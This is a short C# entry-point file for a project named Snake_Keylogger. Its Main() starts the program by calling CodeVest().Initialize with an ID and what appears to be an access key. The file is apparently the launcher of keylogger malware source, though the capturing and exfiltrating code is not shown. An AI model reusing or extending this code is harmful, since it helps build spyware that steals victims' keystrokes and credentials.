using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;
using Snake_Keylogger.snakesystem;

namespace Snake_Keylogger
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            new CodeVest().Initialize("000000465", "vyyhqqns8xpmuubro33kymw3uf7cvjp7");
        }
    }
}

